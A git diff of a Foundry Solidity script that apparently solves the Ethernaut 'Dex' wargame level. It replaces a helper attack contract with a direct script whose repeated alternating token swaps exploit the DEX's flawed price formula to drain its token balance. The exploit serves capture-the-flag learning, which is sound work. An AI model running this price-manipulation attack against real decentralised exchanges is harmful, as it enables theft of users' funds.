@@ -2,50 +2,40 @@
 pragma solidity ^0.8.0;
 import "forge-std/Script.sol";
 import "forge-std/console2.sol";
-
-interface IDex {
-    function swap(address from, address to, uint256 amount) external;
-    function token1() external view returns (address);
-    function token2() external view returns (address);
-    function balanceOf(
-        address token,
-        address account
-    ) external view returns (uint256);
-    function approve(address spender, uint256 amount) external returns (bool);
-    function getSwapPrice(
-        address from,
-        address to,
-        uint256 amount
-    ) external view returns (uint256);
-}
-
-contract AttackDex {
-    IDex level22;
-
-    constructor(address _levelInstance) {
-        level22 = IDex(_levelInstance);
-    }
-
-    function approve(address spender, uint256 amount) public {
-        level22.approve(spender, amount);
-    }
-
-    function trigger() public {
-        IDex(level22).swap(address(this), address(this), 10);
-    }
-
-    receive() external payable {}
-}
+import "../../src/Ethernaut/dex.sol";
 
 contract AttackDexScript is Script {
     function run() public {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        address level22 = 0x0a4Dee5fc56eB9c00363016619859E69B43efc23;
+        Dex dex = Dex(payable(level22));
+        address token1 = dex.token1();
+        address token2 = dex.token2();
 
-        AttackDex attackDex = new AttackDex(
-            0x22fa107F616BEf9f41A913DEaf873E5D4E5ACe85
-        );
-        attackDex.approve(address(attackDex), type(uint256).max);
-        attackDex.trigger();
+        dex.approve(address(dex), type(uint256).max);
+
+        console.log("First swap");
+        console.log("Swap Price 1/2", dex.getSwapPrice(token1, token2, 10));
+        console.log("Swap Price 2/1", dex.getSwapPrice(token2, token1, 10));
+
+        dex.swap(token1, token2, 10);
+
+        console.log("Second swap");
+        console.log("Swap Price 1/2", dex.getSwapPrice(token1, token2, 10));
+        console.log("Swap Price 2/1", dex.getSwapPrice(token2, token1, 10));
+
+        dex.swap(token2, token1, 20);
+
+        dex.swap(token1, token2, 24);
+
+        dex.swap(token2, token1, 30);
+
+        dex.swap(token1, token2, 40);
+
+        dex.swap(token2, token1, 47);
+
+        console.log("Balance of token1", dex.balanceOf(token1, address(dex)));
+        console.log("Balance of token2", dex.balanceOf(token2, address(dex)));
 
         vm.stopBroadcast();
     }
